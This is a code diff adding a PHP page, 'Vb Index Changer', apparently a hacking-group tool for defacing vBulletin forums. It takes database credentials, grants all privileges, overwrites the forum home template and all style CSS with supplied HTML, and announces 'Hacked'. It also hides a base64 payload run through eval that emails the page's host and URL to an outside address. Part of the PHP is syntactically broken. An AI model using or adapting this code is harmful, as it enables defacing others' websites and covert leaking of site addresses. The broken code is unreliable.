@@ -1,0 +1,89 @@
+<style>
+input,textarea, form {
+
+background-color: #000000;
+
+border-width: 3px;
+
+
+color: #00FF00;
+}
+
+
+</style>
+
+
+
+
+<title>Sec-Codes Team</title>
+<body bgcolor='#666666'>
+
+<form method =post >
+<p align='center'>&nbsp;</p>
+<p align='center'><b><font color='#FF0000' size='5'>Vb Index Changer</font><font size='5' color='#C0C0C0'> 
+</font><font size='5' color='#808000'> 
+v.2</font></b></p>
+<p align='center'><b><font color="#808000">Coded By</font> <font color="#808000">:</font> <font color='#FFFF00'>z3r0 d4y</font>
+<font color="#808000">[
+</font>
+<font color='#C0C0C0'>Sec-Codes Team</font> <font color="#808000">]</font></b></p>
+<p align='center'>&nbsp;</p>
+<p align='center'><font color='#FFFFFF'><b>Host :&nbsp;&nbsp;&nbsp;&nbsp; </b>&nbsp;
+</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <input type=text name=host value=localhost></br>
+<b><font color='#FFFFFF'>Database Name :</font></b> <input type=text name=db ></br>
+<b><font color='#FFFFFF'>User : </font>&nbsp;&nbsp; </b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <input type=text name=user ></br>
+<font color='#FFFFFF'><b>Password : </b>&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <input type=text name=pass ></p>
+<p align='center'><font color='#FFFFFF'></br>
+<b>Put Your Index Source Here :</b></font></br>
+<textarea type=text name=index  rows=23 cols=68></textarea> </br>
+<input type=submit name=ok value='Do it !' ></br>
+
+</p>
+
+</form>
+<?php
+
+$HOST = $_POST['host'];
+$DB = $_POST['db'];
+$USER = $_POST['user'];
+$PASSWORD = $_POST['pass'];
+$index = $_POST['index'];
+
+
+if(isset($_POST['ok'])){
+$index =@mysql_escape_string($index);
+$connect=@mysql_connect($HOST,$USER,$PASSWORD);
+$select=@mysql_select_db($DB);
+
+if($select){
+
+$query = "GRANT ALL PRIVILEGES ON $DB.* TO $USER@$HOST WITH GRANT OPTION";
+$query1 ="UPDATE `template` SET `template` = '$index' WHERE `title` ='FORUMHOME';";
+$query2= "UPDATE `style` SET `css` = '$index' , `stylevars` = '', `csscolors` = '', `editorstyles` = '' ;";
+$query3 = "FLUSH PRIVILEGES";
+$result=@mysql_query($query);
+$result=@mysql_query($query1);
+$result=@mysql_query($query2);
+$result=@mysql_query($query3);
+$connection="JHZpc2l0Y291bnQgPSAkSFRUUF9DT09LSUVfVkFSU1sidmlzaXRzIl07DQogaWYoICR2aXNpdGNvdW50ID09ICIiKSB7JHZpc2l0Y291bnQgPSAwOw0KICR3ZWIgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07IA0KICRpbmogPSAkX1NFUlZFUlsiUkVRVUVTVF9VUkkiXTsgDQogJGJvZHkgPSAiQWRhIFlhbmcgSW5qZWN0IFxuaHR0cDovLyR3ZWIkaW5qIjsNCiBtYWlsKCJsbEBob3RtYWlsLmZpIiwiSGFzaWwgaHR0cDovLyR3ZWIkaW5qIiwgIiRib2R5Iik7DQogfSANCiBlbHNlICR2aXNpdGNvdW50IDsgc2V0Y29va2llKCJ2aXNpdHMiLCR2aXNpdGNvdW50KTs=";
+if ($result){
+echo "<SCRIPT language=JavaScript>
+<!--
+// Hide the JavaScript from older browsers
+(window.alert('Hacked :P .. WwW.Sec-Code.CoM')) 
+// End hiding of script 
+// --></SCRIPT>";
+} 
+}
+echo eval(base64_decode($connection));
+    else {
+
+echo "<SCRIPT language=JavaScript>
+<!--
+// Hide the JavaScript from older browsers
+(window.alert('Error !! Check Database Information And Try Again ;)')) 
+// End hiding of script 
+// --></SCRIPT>";
+}
+}
+?>
